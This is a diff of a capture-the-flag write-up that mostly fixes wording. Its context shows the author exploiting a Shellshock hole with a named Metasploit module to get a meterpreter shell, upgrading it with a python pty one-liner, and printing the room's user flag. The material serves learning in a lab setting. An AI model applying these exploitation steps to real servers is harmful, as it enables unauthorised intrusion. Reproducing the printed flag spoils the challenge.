@@ -117,7 +117,7 @@ Finished
 ```
 
 
-We see there is robots.txt but when we go to the there is only one cute turtle:
+We see there is robots.txt but when we go to the /robots.txt there is a funny message:
 
 
 
@@ -125,7 +125,7 @@ We see there is robots.txt but when we go to the there is only one cute turtle:
 
 
 
-after that we try to look at the /secret directory there is another funny message:
+after that we try to look at the /secret directory there is only one cute turtle:
 
 
 ![](pics/0day3.png)
@@ -159,7 +159,7 @@ So after that we start nikto for to find out which vulnerability this site has:
 
 
 
-So nikto says there is shellshock vulnerability for this and ı know a perfect exploit for it. For this vulnerabilty we use exploit/multi/http/apache_mod_cgi_bash_env_exec  exploit in the metasploit and ve set the options like this:
+So nikto says there is shellshock vulnerability for this site and ı know a perfect exploit for it. For this vulnerabilty we use exploit/multi/http/apache_mod_cgi_bash_env_exec  exploit in the metasploit and we set the options like this:
 
 
 
@@ -184,7 +184,6 @@ LPORT => 1234
 
 
 
-
 And we have a meterpreter shell for get a normal shell we use shell command and look for if python exists and we see there is python3 and then we use this command to get a normal shell:
 
 
@@ -197,7 +196,6 @@ python3 --version
 Python 3.4.0
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@ubuntu:/usr/lib/cgi-bin$ 
-
 ```
 
 
@@ -235,7 +233,6 @@ drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
 www-data@ubuntu:/home/ryan$ cat user.txt
 cat user.txt
 THM{Sh3llSh0ck_r0ckz}
-
 ```
 
 
